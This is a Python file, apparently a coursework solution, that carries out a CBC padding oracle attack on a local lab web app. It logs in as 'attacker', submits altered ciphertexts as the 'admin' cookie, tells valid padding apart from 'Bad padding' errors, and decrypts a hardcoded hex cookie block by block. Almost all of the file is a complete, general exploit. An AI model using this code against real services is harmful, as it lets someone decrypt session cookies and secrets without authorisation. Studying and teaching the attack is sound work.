import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import algorithms
from maul import do_login_form
from requests import codes, Session, cookies

import base64
import binascii

SETCOIN_URL = "http://localhost:8080/setcoins"

#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = int(ciphers.algorithms.AES.block_size/8)

    @property
    def block_length(self):
        return self._block_size_bytes

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, sess,ct):
        response = sess.post(self.url, {}, cookies={'admin': ct}).text
        if 'Unspecified error' in response: 
            return -1
        elif 'Bad padding' in response:
            return 0
        else:
            return 1

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    
def po_attack_2blocks(po, ctx,sess):
    """Given two blocks of cipher texts, it can recover the first block of
    the message.
    @po: an instance of padding oracle. 
    @ctx: a ciphertext 
    """
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))
    
    p2 = [0] * po.block_length
    for i in range(1,17):
        pad_byte = po.block_length-i
        for n in range (0,256):
            bytes_array = bytearray(c0[:pad_byte])
            bytes_array.append(n ^ c0[pad_byte])
            bytes_array.extend([i ^ v for v in p2[pad_byte+1:]])
            mauled_c0 = bytes(bytes_array)
            
            ct = (b'\x00' * 16 + mauled_c0 + c1).hex() if pad_byte == 0 else (mauled_c0 + c1).hex() 
            if po.test_ciphertext(sess, ct) == 1: p2[pad_byte] = n ^ c0[pad_byte] ^ i

    msg = ''.join([chr(v1 ^ v2) for v1, v2 in zip(c0, p2)])
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    return msg

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.
    sess = Session()
    assert(do_login_form(sess, "attacker", "attacker"))

    p2 = ''
    for i in range(nblocks-1):
        p2 += po_attack_2blocks(po, ctx_blocks[i] + ctx_blocks[i+1], sess)

    return p2

def do_attack(hexcookie):
    po = PaddingOracle(SETCOIN_URL)
    pwd = po_attack(po,bytes.fromhex(hexcookie))
    print(pwd)

if __name__=="__main__":
    hexcookie = 'e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d'
    print(len(bytes.fromhex(hexcookie)))
    do_attack(hexcookie)
